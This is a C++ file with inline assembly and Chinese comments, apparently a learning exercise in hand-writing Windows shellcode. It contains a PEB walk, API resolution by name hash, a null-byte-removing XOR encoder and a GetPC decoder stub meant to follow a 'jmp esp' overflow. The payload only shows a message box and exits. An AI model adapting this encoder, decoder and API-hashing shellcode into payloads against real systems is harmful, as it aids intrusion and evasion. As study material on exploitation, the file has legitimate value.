#include<Windows.h>
#include<iostream>
#include<tchar.h>

DWORD fun_hash(PCHAR funName) {
	DWORD nDigest = 0;
	while (*funName) {
		nDigest = ((nDigest << 25) | (nDigest >> 7));
		nDigest = nDigest + *funName;
		funName++;
	}
	return nDigest;
}
//计算Hash
VOID fun1() {
	CHAR name[] = "ExitProcess";
	int a = fun_hash(name);
	printf("%x", a);
	system("pause");
}
//加密
bool Encoder() {
	CHAR Shellcode[] = "\x55\x8B\xEC\x83\xEC\x30\xEB\x1B\x63\x89\xD1\x4F\x6A\x0A\x38\x1E\x55\x73\x65\x72\x33\x32\x2E\x64\x6C\x6C\x00\x87\x32\xD8\xC0\x85\xDF\xAF\xBB\xE8\x00\x00\x00\x00\x5A\x89\x55\xFC\x64\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x36\x8B\x36\x8B\x5E\x08\x89\x5D\xF8\x8B\x45\xFC\x8D\x40\xF7\x50\xFF\x75\xF8\xE8\x50\x00\x00\x00\x89\x55\xF4\x8B\x45\xFC\x8D\x40\xF3\x50\xFF\x75\xF8\xE8\x3E\x00\x00\x00\x89\x55\xF0\x33\xF6\x56\x56\x8B\x45\xFC\x8D\x40\xE8\x50\xFF\xD2\x8B\x5D\xFC\x8D\x5B\xE4\x53\x50\xE8\x21\x00\x00\x00\x89\x55\xEC\x33\xF6\x56\x56\x56\x56\xFF\xD2\x8B\x45\xFC\x8D\x40\xE0\x8B\x5D\xF8\x50\x53\xE8\x06\x00\x00\x00\x56\xFF\xD2\x8B\xE5\x5D\x55\x8B\xEC\x83\xEC\x10\x8B\x45\x08\x8B\x70\x3C\x8D\x34\x30\x8B\x76\x78\x8D\x34\x06\x8B\x4E\x1C\x8D\x0C\x01\x89\x4D\xFC\x8B\x56\x20\x8D\x14\x02\x89\x55\xF8\x8B\x5E\x24\x8D\x1C\x03\x89\x5D\xF4\x33\xC9\xEB\x01\x41\x8B\x75\xF8\x8B\x34\x8E\x8D\x34\x06\xFF\x75\x0C\x56\xE8\x20\x00\x00\x00\x85\xDB\x75\xE9\x8B\x5D\xF4\x33\xC0\x3E\x66\x8B\x04\x4B\x8B\x5D\xFC\x8B\x14\x83\x8B\x5D\x08\x8D\x14\x1A\x8B\xE5\x5D\xC2\x08\x00\x55\x8B\xEC\x83\xEC\x10\xC7\x45\xFC\x00\x00\x00\x00\x8B\x75\x08\x51\x50\x33\xC9\x33\xC0\x8A\x04\x0E\x84\xC0\x74\x16\x8B\x5D\xFC\xC1\xE3\x19\x8B\x55\xFC\xC1\xEA\x07\x0B\xDA\x03\xD8\x89\x5D\xFC\x41\xEB\xE3\x8B\x5D\x0C\x8B\x1B\x8B\x55\xFC\x33\xC0\x2B\xDA\x58\x59\x8B\xE5\x5D\xC2\x08\x00";

	int nSize = sizeof(Shellcode);

	int nOutKey = 0;
	PUCHAR pBuffer = NULL;
	bool bComplete = true;
	pBuffer = (PUCHAR)new char[nSize + 1];
	for (int key = 0; key < 0xff; key++) {
		nOutKey = key;
		bComplete = true;
		for (int i = 0; i < nSize; i++) {
			pBuffer[i] = Shellcode[i] ^ key;
			if (0x00 ==pBuffer[i]) {
				bComplete = false;
				break;
			}
		}
		if (bComplete) break;
	}
	if (!bComplete) return false;
	printf("Key%02x = \n", nOutKey);
	for (int i = 0; i < nSize-1; i++) {
		printf("\\x%02x", pBuffer[i]);
	}

	system("pause");
}

int _tmain(char* argv, char* args[]) {
	//fun1();
	Encoder();


	//ps:捷径可不适合攀登者
	//暂且放弃C编写Shellcode

	//*****************************************************************************************************************
	//函数fun_findFunAddress 查找函数地址			参数1:模块基址					参数2:函数名hash摘要 返回值edx是函数地址
	//函数fun_Hash_CmpString 根据hasn查找字符串	参数1:模块基址中遍历到的字符串地址	参数2:摘要
	//*****************************************************************************************************************

	//解密Shellcode(shellcode放在jmp esp 后)
	//"\x33\xC0\xE8\xFF\xFF\xFF\xFF\xC3\x58\x8D\x70\x1B\x33\xC9\x66\xB9\x6D\x01\x8A\x04\x0E\x34\x05\x88\x04\x0E\xE2\xF6\x80\x34\x0E\x05\xFF\xE6"
	__asm {
		mov eax, eax;
		mov eax, eax;
		mov eax, eax;

		xor eax, eax;
		call tag_GetPC - 1;
	tag_GetPC:
		ret;
		pop eax;
		lea esi, [eax + 0x1b];
		xor ecx, ecx;
		mov cx, 0x16D;
	tag_Decode:
		mov al, [esi + ecx];
		xor al, 0x5;
		mov[esi + ecx], al;
		loop tag_Decode;
		xor [esi + ecx], 0x5;
		jmp esi;

		mov eax, eax;
		mov eax, eax;
		mov eax, eax;
	}
	


	//源ShellCode(shellcode放在解密shellcode后)
	__asm {

		mov eax, eax;
		mov eax, eax;
		mov eax, eax;


		//不需要保存环境？
		push ebp;
		mov ebp, esp;
		sub esp, 0x30;
		jmp tag_Section1;

		//摘要4fd18963 ExitProcess local1-0x20
		_asm _emit(0x63) _asm _emit(0x89) _asm _emit(0xd1) _asm _emit(0x4f);
		//摘要1e380a6a MessageBoxA  local1-0x1c
		_asm _emit(0x6a) _asm _emit(0x0a) _asm _emit(0x38) _asm _emit(0x1e);

		//"User32.dll\0" 也可以强行hash，如果dll很多的话，需要遍历链表去找这个dll了
		//local1-0x18
		_asm _emit(0x55) _asm _emit(0x73) _asm _emit(0x65) _asm _emit(0x72) _asm _emit(0x33)
		_asm _emit(0x32) _asm _emit(0x2E) _asm _emit(0x64) _asm _emit(0x6c) _asm _emit(0x6c)
		_asm _emit(0x00)

		//摘要c0d83287 LoadLibrary local1-0xd
		_asm _emit(0x87) _asm _emit(0x32) _asm _emit(0xd8) _asm _emit(0xc0);
		//摘要bbafdf85 GetProcAddress local1-0x9
		_asm _emit(0x85) _asm _emit(0xdf) _asm _emit(0xaf) _asm _emit(0xbb);

	tag_Section1:
		call tag_Section2;
	tag_Section2:
		//edx是tag_Section2，用来计算偏移
		pop edx;
		mov[ebp - 0x4], edx;			//local1 = offset
		//去拿kernel32.dll的基址
		mov esi, dword ptr fs : [0x30] ;
		mov esi, [esi + 0xc];
		mov esi, [esi + 0x1c];
		mov esi, [esi];
		mov esi, [esi];
		//ebx是Kernel32.dll的基址
		mov ebx, [esi + 0x8];
		mov[ebp - 0x8], ebx;		//local2 = Kernel32.dll基址
		//寻找GetProcAddress地址
		mov eax, [ebp - 0x4];
		lea eax, [eax - 0x9];
		push eax;					//GetProcAddress摘要
		push[ebp - 0x8];			//Kernel32.dll基址
		//拿GetProcAddress 的地址 edx是函数地址
		call fun_findFunAddress;
		mov[ebp - 0xc], edx;		//local3 = GetProcAddress
		mov eax, [ebp - 0x4];
		lea eax, [eax - 0xd];
		push eax;
		push[ebp - 0x8];
		//拿LoadLibraryExA 的地址 edx是函数地址
		call fun_findFunAddress;
		mov[ebp - 0x10], edx;		//local4 = LoadLibraryExA
		xor esi, esi;
		push esi;
		push esi;
		mov eax, [ebp - 0x4];
		lea eax, [eax - 0x18];
		push eax;
		call edx;					//eax = user32.dll的基址
		mov ebx, [ebp - 0x4];
		lea ebx, [ebx - 0x1c];
		push ebx;
		push eax;
		call fun_findFunAddress;
		mov[ebp - 0x14], edx;		//local5 = MessageBoxA;
		//****************************************
		//提问：字符串如何瘦身？
		xor esi, esi;
		push esi;
		push esi;
		push esi;
		push esi;
		call edx;
		//****************************************
		mov eax, [ebp - 0x4];
		lea eax, [eax - 0x20];
		mov ebx, [ebp - 0x8];
		push eax;
		push ebx;
		call fun_findFunAddress;	//找ExitProcess地址
		push esi;
		call edx;

		mov esp, ebp;
		pop ebp;

	fun_findFunAddress:			//返回值是EDX
		//开辟栈帧,保存环境
		push ebp;
		mov ebp, esp;
		sub esp, 0x10;
		//先拿三张表地址
		mov eax, [ebp + 0x8];	//eax = 基址
		mov esi, [eax + 0x3c];
		lea esi, [eax + esi];	//esi = pe头
		mov esi, [esi + 0x78];
		lea esi, [esi + eax];	//esi = export_table
		mov ecx, [esi + 0x1c];
		lea ecx, [ecx + eax];	//ecx = EAT
		mov[ebp - 0x4], ecx;	//[ebp-0x4]==>函数地址表
		mov edx, [esi + 0x20];
		lea edx, [edx + eax];	//edx = ENT
		mov[ebp - 0x8], edx;	//[ebp-0x8]==>函数名称表
		mov ebx, [esi + 0x24];
		lea ebx, [ebx + eax];	//ebx = EOT
		mov[ebp - 0xc], ebx;	//[ebp-0xC]==>函数序号表

		xor ecx, ecx;
		jmp tag_FirstCmp;
	tag_CmpFunNameLoop:
		inc ecx;
	tag_FirstCmp:
		mov esi, [ebp - 0x8];			//esi = 函数名称表
		mov esi, [esi + 0x4 * ecx];
		lea esi, [esi + eax];			//esi = 函数名称字符串地址
		push[ebp + 0xc];				//摘要
		push esi;						//字符串地址
		call fun_Hash_CmpString;
		test ebx, ebx;					//判断返回值是否为0(0为找到,1为没找到) 返回值是ebx
		jne tag_CmpFunNameLoop;
		//此时ecx就是下标，拿着这个下标去序号表里找
		mov ebx, [ebp - 0xc];
		xor eax, eax;
		mov ax, word ptr ds : [ebx + 0x2 * ecx] ;
		//ax就是函数地址表里对应函数的下标 edx最终求得函数地址
		mov ebx, [ebp - 0x4];
		mov edx, [ebx + 0x4 * eax];
		mov ebx, [ebp + 0x8];
		lea edx, [edx + ebx];

		mov esp, ebp;
		pop ebp;
		ret 0x8;

	fun_Hash_CmpString:		//(char* name,char nDigest)		从ENT表中传来的name，从外部传来的摘要
		push ebp;
		mov ebp, esp;
		sub esp, 0x10;
		mov dword ptr[ebp - 0x4], 0;
		mov esi, [ebp + 0x8];		//esi = 字符串地址
		push ecx;
		push eax;
		xor ecx, ecx;
		xor eax, eax;
	tag_HashLoop:
		mov al, [esi + ecx];
		test al, al;				//如果为0，说明字符串到了结尾，结束循环
		je tag_HashEnd;
		mov ebx, [ebp - 0x4];
		shl ebx, 0x19;
		mov edx, [ebp - 0x4];
		shr edx, 0x7;
		or ebx, edx;
		add ebx, eax;
		mov[ebp - 0x4], ebx;
		inc ecx;
		jmp tag_HashLoop;
	tag_HashEnd:
		mov ebx, [ebp + 0xc];
		mov ebx, [ebx];				//ebx = 摘要(param2)
		mov edx, [ebp - 0x4];		//edx = 摘要(local)
		xor eax, eax;
		sub ebx, edx;
		pop eax;
		pop ecx;
		mov esp, ebp;
		pop ebp;
		ret 0x8;

		mov eax, eax;
		mov eax, eax;
		mov eax, eax;
	}

	system("pause");
	return 0;
}